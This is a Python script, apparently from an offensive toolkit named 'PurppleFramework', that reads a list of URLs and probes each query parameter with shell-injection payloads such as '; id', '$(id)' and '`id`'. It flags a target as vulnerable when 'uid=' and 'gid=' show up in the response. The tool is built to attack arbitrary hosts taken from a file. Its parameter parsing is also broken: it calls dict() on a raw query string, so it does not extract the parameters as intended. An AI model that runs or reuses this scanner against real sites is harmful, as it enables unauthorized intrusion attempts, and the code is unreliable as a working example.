import requests
import os
from urllib.parse import urlparse, urlencode

# -------------------------------
# CONFIGURATION
# -------------------------------
# Find the correct path for urls.txt inside PurppleFramework/txts/
script_dir = os.path.dirname(os.path.abspath(__file__))  # Current script directory
purppleframework_dir = os.path.abspath(os.path.join(script_dir, "..", "..", ".."))  # Navigate up to PurppleFramework
txts_dir = os.path.join(purppleframework_dir, "txts")  # Path to txts directory
os.makedirs(txts_dir, exist_ok=True)  # Ensure the 'txts' folder exists

URLS_FILE = os.path.join(txts_dir, "urls.txt")  # Input file

REQUEST_TIMEOUT = 5  # Seconds before requests time out

# -------------------------------
# COMMAND INJECTION TESTER
# -------------------------------
def test_command_injection(target):
    """
    Checks if a URL is vulnerable to command injection by injecting shell commands.
    """
    payloads = [
        "; id",
        "| id",
        "&& id",
        "|| id",
        "$(id)",
        "`id`"
    ]
    
    parsed_url = urlparse(target)
    query_params = dict(parsed_url.query)
    
    if not query_params:
        return False
    
    for param in query_params:
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = payload
            test_query = urlencode(test_params)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
            
            try:
                response = requests.get(test_url, timeout=REQUEST_TIMEOUT)
                if "uid=" in response.text and "gid=" in response.text:
                    print(f"[!] Command Injection Found: {test_url}")
                    return True
            except requests.exceptions.RequestException:
                print(f"[-] Could not connect to {test_url}")
    
    return False

# -------------------------------
# MAIN FUNCTION: SCAN URL LIST
# -------------------------------
def scan_command_injection():
    """
    Reads each URL from 'PurppleFramework/txts/urls.txt' and checks for command injection vulnerabilities.
    """
    if not os.path.exists(URLS_FILE):
        print(f"[!] Error: '{URLS_FILE}' not found!")
        return

    with open(URLS_FILE, "r") as f:
        urls = [u.strip() for u in f if u.strip()]
    
    print("[+] Scanning URLs for command injection vulnerabilities...")
    found_vuln = False
    
    for url in urls:
        if test_command_injection(url):
            found_vuln = True
    
    if not found_vuln:
        print("[-] No command injection vulnerabilities found on any URLs.")

if __name__ == "__main__":
    scan_command_injection()
